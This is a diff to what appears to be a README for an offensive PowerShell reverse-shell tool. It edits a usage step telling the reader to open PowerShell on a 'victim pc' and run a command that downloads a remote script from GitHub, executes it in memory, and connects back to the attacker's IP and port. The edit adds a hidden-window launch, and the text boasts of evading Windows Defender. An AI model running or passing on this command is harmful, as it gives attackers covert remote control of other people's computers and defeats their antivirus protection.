@@ -9,7 +9,7 @@
  <br> 
 2.) Open powershell on the victim pc and type:-  <br> 
  <br> 
-IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/Invoke-DopeShell.ps1' -UseBasicParsing) | Invoke-DopeShell "IP" "PORT". <br> Enter the IP ADDR and PORT of YOUR machine from where you are listening.
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/Invoke-DopeShell.ps1' -UseBasicParsing); Invoke-DopeShell 'IP' 'PORT'". <br> Enter the IP ADDR and PORT of YOUR machine from where you are listening.
 
 ## This will spawn a interactive shell with the target pc and run in memory to evade AV 
 ### Currently undetectable by the latest updated version of windows defender on Win 11 ( last tested on 17:00 IST June 13th 2024) 
